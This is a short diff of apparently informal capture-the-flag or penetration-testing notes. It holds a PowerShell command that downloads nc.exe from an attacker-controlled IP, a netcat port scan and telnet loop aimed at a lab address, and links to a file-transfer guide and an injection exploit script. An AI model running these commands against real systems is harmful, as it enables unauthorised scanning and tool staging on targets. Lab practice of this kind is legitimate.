@@ -17,6 +17,7 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile(“http://<ip>/nc.
 blog: https://blog.ropnop.com/transferring-files-from-kali-to-windows/
 
 
+nc 10.10.202.174 1-100 -v [same thing] for i in {50..100}; do (sleep 1; echo "get /") | telnet hell $i | grep 550 >> x ; done
 
 
 it use ctf & bouty & similar as netcat : https://github.com/musyoka101/Injection-TryHackMe-exploit-script
